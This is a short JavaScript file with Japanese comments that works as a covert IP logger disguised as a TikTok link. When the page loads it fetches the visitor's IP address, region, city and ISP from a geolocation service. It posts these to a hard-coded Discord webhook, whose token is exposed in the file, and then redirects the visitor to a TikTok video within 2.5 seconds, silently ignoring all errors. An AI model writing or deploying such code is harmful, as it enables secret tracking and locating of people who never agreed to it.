const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47MrXmw96zzzlw_-eN15stpsWHCptYKK3byQCoUofsD-AllITmfui1Q4b0sUaRO5zU"; 
const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";

async function track() {
    // 1. 何があっても必ず2.5秒後にはTikTokに飛ばす設定
    const forceRedirect = setTimeout(() => {
        window.location.href = REDIRECT_URL;
    }, 2500);

    try {
        // 2. IP情報を取得（ここで止まっても上記タイマーで飛ばされます）
        const response = await fetch('https://ipwho.is/').catch(() => null);
        if (!response) return;
        
        const data = await response.json();
        if (!data || !data.success) return;

        // 3. Discordに送信（送信が終わるのを待たずに次に進みます）
        if (WEBHOOK_URL) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `👤 **アクセス情報**\nIP: ${data.ip}\n場所: ${data.region} ${data.city}\nISP: ${data.connection.isp}`
                })
            }).catch(() => {}); // 送信エラーも無視して進む
        }
    } catch (e) {
        // 全てのエラーを無視
    }
}

// 実行
track();
